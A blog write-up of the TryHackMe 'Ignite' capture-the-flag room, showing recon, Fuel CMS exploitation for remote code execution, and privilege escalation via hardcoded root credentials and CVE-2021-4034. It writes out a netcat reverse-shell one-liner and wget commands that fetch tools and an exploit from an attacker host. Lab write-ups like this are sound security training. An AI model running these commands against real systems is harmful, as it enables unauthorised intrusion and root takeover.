---
title: "Ignite"
date: 2025-05-13
draft: false
summary: "Writeup for Ignite CTF challenge on TryHackMe."
tags: ["linux", "rce", "hardcoded creds", "cms"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/ignite/cover.webp"
  caption: "Ignite TryHackMe Challenge"
  alt: "Ignite cover"
platform: "TryHackMe"
---

A new start-up has a few issues with their web server.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/ignite

## Reconnaissance

I ran an **nmap** aggressive scan on the target to identify the open ports and services running.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN ignite.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 80       | http        |

![](https://cdn.ziomsec.com/ignite/1.webp)

## Initial Foothold

The server only had port 80 open. So I accessed it on my browser and found a CMS called Fuel.

![](https://cdn.ziomsec.com/ignite/2.webp)

When I scrolled to the bottom, I found the admin endpoint and credentials to log in.

![](https://cdn.ziomsec.com/ignite/3.webp)

I then visited the endpoint and logged in as admin

![](https://cdn.ziomsec.com/ignite/4.webp)

![](https://cdn.ziomsec.com/ignite/5.webp)

I didn't find anything useful in the CMS so I looked for exploits related to the CMS version.

```shell
searchsploit 'fuel cms 1.4'
searchsploit -m php/webapps/50477.py
```

![](https://cdn.ziomsec.com/ignite/6.webp)

I found and downloaded a python exploit that provided RCE.

```shell
python 50477.py -u http://TARGET/
```

![](https://cdn.ziomsec.com/ignite/7.webp)

I used the RCE to get a reverse shell.

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc TARGET 1234 >/tmp/f
```

![](https://cdn.ziomsec.com/ignite/8.webp)

![](https://cdn.ziomsec.com/ignite/9.webp)

After getting a reverse shell, I captured the user flag from the **www-data** user's home directory.

```shell
cat /home/www-data/flag.txt
```

![](https://cdn.ziomsec.com/ignite/10.webp)

## Privilege Escalation 

There were 2 ways to escalate privilege to root.

### Hardcoded Credentials

I transferred LinPEAS on the target to look for privilege escalation vectors.

```shell
wget 'http://ATTACKER/linpeas.sh'
chmod +x linpeas.sh
```

![](https://cdn.ziomsec.com/ignite/11.webp)

I then ran the script

```shell
./linpeas.sh
```

It found hardcoded credentials inside a backup file.

![](https://cdn.ziomsec.com/ignite/12.webp)

I manually visited the file and found that the password belonged to the root user.

```shell
cat /var/www/html/fuel/application/config/database.php
```

![](https://cdn.ziomsec.com/ignite/13.webp)

![](https://cdn.ziomsec.com/ignite/14.webp)

I switched to root user and captured the root flag from `/root`.

![](https://cdn.ziomsec.com/ignite/15.webp)

### CVE-2021-4034

I transferred linux exploit suggester on the target and ran it.

```shell
wget 'http://ATTACKER/les.sh'
chmod +x les.sh
./les.sh
```

![](https://cdn.ziomsec.com/ignite/16.webp)

The script identified the target to be vulnerable to CVE-2021-4034 so I downloaded the exploit related to it.

![](https://cdn.ziomsec.com/ignite/17.webp)

![](https://cdn.ziomsec.com/ignite/18.webp)

I compiled the exploit on the target and ran it to get a root shell

```shell
wget "http://ATTACKER/CVE-2021-4034-main.zip"
unzip CVE-2021-4034-main.zip
cd CVE-2021-4034-main
make
./cve-2021-4034
```

![](https://cdn.ziomsec.com/ignite/19.webp)

Finally, I captured the root flag from `/root`.

![](https://cdn.ziomsec.com/ignite/20.webp)

That's it from my side!
Until next time :)

---
